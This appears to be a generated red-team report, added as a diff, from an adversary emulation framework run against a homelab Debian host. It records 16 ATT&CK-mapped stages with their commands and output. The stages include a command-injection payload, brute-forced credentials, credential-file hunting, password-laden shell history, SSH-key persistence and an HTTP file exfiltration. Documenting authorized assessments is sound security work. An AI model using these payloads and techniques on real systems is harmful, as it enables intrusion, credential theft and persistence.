@@ -1,0 +1,257 @@
+# MyTRE Campaign Report
+
+> ⚠️ **Authorized use only.** This report documents a controlled security assessment performed on systems owned or explicitly authorized for testing.
+
+## Campaign Overview
+
+| Field | Value |
+|-------|-------|
+| Campaign | homelab_assessment |
+| Started | 2026-10-12 06:25:12 UTC |
+| Finished | 2026-10-12 06:26:19 UTC |
+| Duration | 66.21s |
+| Stages Run | 16 |
+| Stages Succeeded | 15 |
+| Report Generated | 2026-10-12 06:26:19 UTC |
+
+## Executive Summary
+
+Campaign **homelab_assessment** ran 16 ATT&CK-mapped technique(s), of which 15 succeeded. 1 stage(s) did not achieve their objective.
+
+## Findings Summary
+
+| # | Technique | ATT&CK ID | Tactic | Result | Severity | Duration |
+|---|-----------|-----------|--------|--------|----------|----------|
+| 1 | port-scan | T1046 | reconnaissance | ✅ Success | Informational | 50.05s |
+| 2 | service-fingerprint | T1592 | reconnaissance | ✅ Success | Informational | 0.03s |
+| 3 | vuln-scan | T1595.002 | reconnaissance | ❌ Failed | N/A | 0.00s |
+| 4 | http-default-creds | T1078 | initial-access | ✅ Success | High | 0.20s |
+| 5 | command-injection | T1190 | initial-access | ✅ Success | High | 3.12s |
+| 6 | ssh-brute-force | T1110.001 | credential-access | ✅ Success | Critical | 1.19s |
+| 7 | creds-in-files | T1552 | credential-access | ✅ Success | Critical | 2.05s |
+| 8 | account-discovery | T1087 | discovery | ✅ Success | Informational | 1.99s |
+| 9 | process-discovery | T1057 | discovery | ✅ Success | Informational | 1.56s |
+| 10 | network-config-discovery | T1016 | discovery | ✅ Success | Informational | 2.48s |
+| 11 | file-directory-discovery | T1083 | discovery | ✅ Success | Informational | 0.81s |
+| 12 | ssh-pivot | T1021.004 | lateral-movement | ✅ Success | Critical | 0.32s |
+| 13 | lateral-tool-transfer | T1570 | lateral-movement | ✅ Success | Critical | 0.39s |
+| 14 | ssh-authorized-key | T1098 | persistence | ✅ Success | Critical | 1.36s |
+| 15 | local-file-stage | T1074.001 | exfiltration | ✅ Success | Critical | 0.00s |
+| 16 | http-exfil | T1041 | exfiltration | ✅ Success | Critical | 0.21s |
+
+## Artifacts Collected
+
+**Discovered Hosts:**
+- `192.168.0.115` — open ports: [22]
+  - Notes: SSH pivot confirmed as fareed
+
+**Validated Accounts (usernames only):**
+- `admin` — via http-default-creds, valid on: ['http://192.168.0.115:8080']
+- `fareed` — via ssh-brute-force, valid on: ['192.168.0.115']
+
+**Staged Files:**
+- `/tmp/mytre_marker.txt` — Transferred to 192.168.0.115 via SFTP
+- `testdata/stage4-test.txt` — explicitly configured staged file
+
+**Persistence Indicators:**
+- {'type': 'ssh_authorized_key', 'host': '192.168.0.115', 'key_comment': 'mytre-test'}
+
+## Stage-by-Stage Details
+
+### Stage 1: port-scan (T1046)
+- **Tactic:** reconnaissance
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:25:12 UTC
+- **Duration:** 50.05s
+- **Summary:** Found 1 open port(s) on 192.168.0.115: [22]
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `ports_scanned`: 1-100
+  - `open_ports`: [22]
+
+### Stage 2: service-fingerprint (T1592)
+- **Tactic:** reconnaissance
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:26:03 UTC
+- **Duration:** 0.03s
+- **Summary:** Fingerprinted 1 port(s) on 192.168.0.115; got banners from 1: [22]
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `fingerprints`: {22: {'service': 'SSH', 'banner': 'SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4'}}
+
+### Stage 3: vuln-scan (T1595.002)
+- **Tactic:** reconnaissance
+- **Result:** Failed
+- **Severity:** N/A
+- **Started:** 2026-10-12 06:26:03 UTC
+- **Duration:** 0.00s
+- **Summary:** No known CVE signatures matched banners on 192.168.0.115
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `findings`: []
+
+### Stage 4: http-default-creds (T1078)
+- **Tactic:** initial-access
+- **Result:** Success
+- **Severity:** High
+- **Started:** 2026-10-12 06:26:03 UTC
+- **Duration:** 0.20s
+- **Summary:** Valid web credentials found at http://192.168.0.115:8080/login.php: admin (tried 2 pairs)
+- **Evidence:**
+  - `login_url`: http://192.168.0.115:8080/login.php
+  - `pairs_tried`: 2
+  - `username`: admin
+
+### Stage 5: command-injection (T1190)
+- **Tactic:** initial-access
+- **Result:** Success
+- **Severity:** High
+- **Started:** 2026-10-12 06:26:03 UTC
+- **Duration:** 3.12s
+- **Summary:** Command injection confirmed at http://192.168.0.115:8080/vulnerabilities/exec/ — payload: '127.0.0.1; id' — output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+- **Evidence:**
+  - `endpoint`: http://192.168.0.115:8080/vulnerabilities/exec/
+  - `payloads_tried`: 8
+  - `successful_payload`: 127.0.0.1; id
+  - `rce_output`: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+### Stage 6: ssh-brute-force (T1110.001)
+- **Tactic:** credential-access
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:06 UTC
+- **Duration:** 1.19s
+- **Summary:** Valid credential found for user fareed on 192.168.0.115:22 (tried 1/13 passwords)
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `port`: 22
+  - `username`: fareed
+
+### Stage 7: creds-in-files (T1552)
+- **Tactic:** credential-access
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:07 UTC
+- **Duration:** 2.05s
+- **Summary:** Found 3 credential-bearing file(s)/location(s) on 192.168.0.115
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `findings`: [{'command': "find /home /root -name '.env' -o -name '*.env' 2>/dev/null | head -5", 'output': '/home/fareed/wazuh-docker/build-docker-images/wazuh-manager/config/permanent_data.env\n/home/fareed/wazuh-docker/.env'}, {'command': "find /etc -name '*.conf' | xargs grep -l 'password' 2>/dev/null | head -5", 'output': '/etc/sudo_logsrvd.conf\n/etc/firebird/4.0/firebird.conf\n/etc/security/pwhistory.conf\n/etc/debconf.conf\n/etc/reportbug.conf'}, {'command': "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|mysql\\|ssh' | head -10", 'output': 'cat > ~/passwords.txt << \'EOF\'\npassword\ncat ~/passwords.txt\nhydra -l admin -P ~/passwords.txt 192.168.0.115 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -s 8080 -V\ncurl -v -d "username=admin&password=wrongpass123&Login=Login" http://192.168.0.115:8080/login.php 2>&1 | tail -30\nhydra -l admin -P ~/passwords.txt 192.168.0.115 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed:H=Cookie: security=low" -s 8080 -V\nhydra -l admin '}]
+
+### Stage 8: account-discovery (T1087)
+- **Tactic:** discovery
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:26:10 UTC
+- **Duration:** 1.99s
+- **Summary:** Account discovery on 192.168.0.115: 4 interactive account(s) found — ['root', 'sync', 'fareed', 'bruteforcetest']
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `accounts`: ['root', 'sync', 'fareed', 'bruteforcetest']
+  - `findings`: {'cat /etc/passwd | grep -v nologin | grep -v false | grep -v halt | grep -v shutdown': 'root:x:0:0:root:/root:/bin/bash\nsync:x:4:65534:sync:/bin:/bin/sync\nfareed:x:1000:1000:fareed,,,:/home/fareed:/bin/bash\nbruteforcetest:x:1001:1001::/home/bruteforcetest:/bin/bash', 'getent group sudo 2>/dev/null || grep sudo /etc/group': 'sudo:x:27:fareed', 'last -n 10 2>/dev/null': 'fareed   pts/0        192.168.0.113    Mon Oct 12 09:32 - still logged in\nfareed   pts/1        192.168.0.113    Sun Oct 11 21:59 - 22:34  (00:34)\nfareed   pts/0        192.168.0.113    Sun Oct 11 17:51 - 02:06  (08:15)\nreboot   system boot  6.12.107+deb13-a Sun Oct 11 17:49 - still running\nreboot   system boot  6.12.107+deb13-a Wed Oct  7 19:23 - crash \nfareed   pts/0        100.109.220.43   Tue Oct  6 11:41 - crash \nfareed   pts/0        192.168.0.113    Sat Oct  3 16:54 - 02:00  (09:05)\nfaree', 'who 2>/dev/null': 'fareed   sshd         2026-10-12 11:56 (192.168.0.113)\nfareed   sshd pts/0   2026-10-12 09:32 (192.168.0.113)', 'id': 'uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth),989(docker)'}
+
+### Stage 9: process-discovery (T1057)
+- **Tactic:** discovery
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:26:12 UTC
+- **Duration:** 1.56s
+- **Summary:** Process discovery on 192.168.0.115: captured 2 process listing(s)
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `findings`: {'ps aux --sort=-%cpu | head -20': 'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot      271385  3.1  0.2  19636 11452 ?        Ss   11:56   0:00 sshd-session: fareed [priv]\nfareed      1806  1.9 31.6 3938520 1231996 ?     Ssl  Oct11  21:27 /usr/share/wazuh-indexer/jdk/bin/java -Xshare:auto -Dopensearch.networkaddress.cache.ttl=60 -Dopensearch.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -XX:+ShowCodeDetailsInExceptionMessages -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dio.netty.allocator.numDirectArenas=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.security.manager=allow -Djava.locale.providers=SPI,COMPAT -XX:+UseG1GC -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -Djava.io.tmpdir=/tmp/opensearch-5383318941738066642 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/wazu', "ps aux | grep -E '(apache|nginx|mysql|postgres|docker|wazuh|ssh)' | grep -v grep": 'root        1018  0.2  1.4 2576604 55784 ?       Ssl  Oct11   2:18 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\nfareed      1806  1.9 31.6 3938520 1231996 ?     Ssl  Oct11  21:27 /usr/share/wazuh-indexer/jdk/bin/java -Xshare:auto -Dopensearch.networkaddress.cache.ttl=60 -Dopensearch.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -XX:+ShowCodeDetailsInExceptionMessages -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dio.netty.allocator.numDirectArenas=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.security.manager=allow -Djava.locale.providers=SPI,COMPAT -XX:+UseG1GC -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -Djava.io.tmpdir=/tmp/opensearch-5383318941738066642 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/wazuh-indexer -XX:ErrorFile=/var/log'}
+
+### Stage 10: network-config-discovery (T1016)
+- **Tactic:** discovery
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:26:13 UTC
+- **Duration:** 2.48s
+- **Summary:** Network config discovery on 192.168.0.115: 5 data point(s) collected
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `findings`: {'ip addr show 2>/dev/null || ifconfig 2>/dev/null | head -30': '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp1s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 74:86:7a:14:51:d7 brd ff:ff:ff:ff:ff:ff\n    altname enx74867a1451d7\n3: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether 1c:3e:84:a4:91:43 brd ff:ff:ff:ff:ff:ff\n    altname wlx1c3e84a49143\n    inet 192.168.0.115/24 brd 192.168.0.255 scope global noprefixroute wlp2s0\n       valid_lft forever preferred_lft forev', 'ip route show 2>/dev/null || route -n 2>/dev/null': 'default via 192.168.0.1 dev wlp2s0 proto dhcp src 192.168.0.115 metric 3003 \n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 \n172.18.0.0/16 dev br-9e742758e14b proto kernel scope link src 172.18.0.1 \n192.168.0.0/24 dev wlp2s0 proto dhcp scope link src 192.168.0.115 metric 3003', 'ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null | head -20': 'State  Recv-Q Send-Q               Local Address:Port  Peer Address:PortProcess                            \nLISTEN 0      4096                       0.0.0.0:9200       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:443        0.0.0.0:*                                      \nLISTEN 0      4096                 100.98.206.31:45417      0.0.0.0:*                                      \nLISTEN 0      128                        0.0.0.0:22         0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:8000       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:8080       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0', 'cat /etc/resolv.conf 2>/dev/null': '# Generated by dhcpcd from wlp2s0.dhcp, wlp2s0.dhcp6\n# /etc/resolv.conf.head can replace this line\nnameserver 49.205.171.194\nnameserver 49.207.34.210\nnameserver 2406:b400:8:1::2\nnameserver 2406:b400:50:7::2\n# /etc/resolv.conf.tail can replace this line', "cat /etc/hosts | grep -v '^#' | grep -v '^$'": '127.0.0.1\tlocalhost\n127.0.1.1\thomelab\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters'}
+
+### Stage 11: file-directory-discovery (T1083)
+- **Tactic:** discovery
+- **Result:** Success
+- **Severity:** Informational
+- **Started:** 2026-10-12 06:26:16 UTC
+- **Duration:** 0.81s
+- **Summary:** File/directory discovery on 192.168.0.115: 4 location(s) enumerated
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `findings`: {'ls -la /home/': 'total 16\ndrwxr-xr-x  4 root           root           4096 Oct  3 17:13 .\ndrwxr-xr-x 18 root           root           4096 Sep  5 22:09 ..\ndrwx------  2 bruteforcetest bruteforcetest 4096 Oct  3 17:13 bruteforcetest\ndrwx------ 10 fareed         fareed         4096 Oct 12 09:28 fareed', "ls -la /etc/ | grep -E '\\.(conf|cfg|ini)$' | head -10": '-rw-r--r--  1 root root    3981 May  6  2025 adduser.conf\n-rw-r--r--  1 root root    6422 Sep  5 22:15 ca-certificates.conf\n-rw-r--r--  1 root root    2967 Mar 10  2025 debconf.conf\n-rw-r--r--  1 root root    1706 May  6  2025 deluser.conf\n-rw-r--r--  1 root root    1274 Jun 26 20:53 dhcpcd.conf\n-rw-r--r--  1 root root     685 May  9 17:06 e2scrub.conf\n-rw-r--r--  1 root root    2584 Jan 28  2025 gai.conf\n-rw-r--r--  1 root root       9 Jul  4 14:35 host.conf\n-rw-r--r--  1 root root     708 Dec ', 'find /tmp /var/tmp -maxdepth 1 -type f 2>/dev/null | head -10': '/tmp/mytre_marker.txt\n/tmp/mytre-wazuh-test.txt\n/tmp/mytre-stage4-upload.bin\n/tmp/mytre_test_receiver.py', 'ls -la ~/.ssh/ 2>/dev/null || echo NOT_FOUND': 'total 12\ndrwx------  2 fareed fareed 4096 Oct 12 09:32 .\ndrwx------ 10 fareed fareed 4096 Oct 12 09:28 ..\n-rw-------  1 fareed fareed  255 Oct 12 11:45 authorized_keys'}
+
+### Stage 12: ssh-pivot (T1021.004)
+- **Tactic:** lateral-movement
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:16 UTC
+- **Duration:** 0.32s
+- **Summary:** SSH pivot to 192.168.0.115:22 as fareed — probe output: uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugd
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `port`: 22
+  - `username`: fareed
+  - `probe_command`: id && hostname && uname -a
+  - `probe_output`: uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth),989(docker)
+homelab
+Linux homelab 6.12.107+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.107-1 (2026-08-29) x86_64 GNU/Linux
+  - `probe_stderr`: 
+
+### Stage 13: lateral-tool-transfer (T1570)
+- **Tactic:** lateral-movement
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:17 UTC
+- **Duration:** 0.39s
+- **Summary:** Transferred 54 bytes to 192.168.0.115:/tmp/mytre_marker.txt (remote size confirmed: 54 bytes)
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `local_file`: C:\Users\User\AppData\Local\Temp\mytre_kq4td692.txt
+  - `remote_path`: /tmp/mytre_marker.txt
+  - `local_size_bytes`: 54
+  - `remote_size_bytes`: 54
+
+### Stage 14: ssh-authorized-key (T1098)
+- **Tactic:** persistence
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:17 UTC
+- **Duration:** 1.36s
+- **Summary:** Persistence established on 192.168.0.115:22 as fareed — SSH key added to ~/.ssh/authorized_keys (key comment: mytre-test)
+- **Evidence:**
+  - `target`: 192.168.0.115
+  - `username`: fareed
+  - `verification_output`: ['ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKeyForMyTREAuthorizedTestingOnly mytre-test']
+
+### Stage 15: local-file-stage (T1074.001)
+- **Tactic:** exfiltration
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:18 UTC
+- **Duration:** 0.00s
+- **Summary:** Staged 1 explicitly configured local file(s)
+- **Evidence:**
+  - `paths_configured`: ['testdata/stage4-test.txt']
+  - `staged`: ['testdata/stage4-test.txt']
+  - `missing`: []
+
+### Stage 16: http-exfil (T1041)
+- **Tactic:** exfiltration
+- **Result:** Success
+- **Severity:** Critical
+- **Started:** 2026-10-12 06:26:18 UTC
+- **Duration:** 0.21s
+- **Summary:** Exfiltrated 1 file(s) (184 bytes) to http://192.168.0.115:8081/upload — HTTP 200
+- **Evidence:**
+  - `listener_url`: http://192.168.0.115:8081/upload
+  - `files_exfiltrated`: ['testdata/stage4-test.txt']
+  - `archive_size_bytes`: 184
+  - `http_status`: 200
+
+---
+*Generated by MyTRE — ATT&CK-Mapped Adversary Emulation Framework*
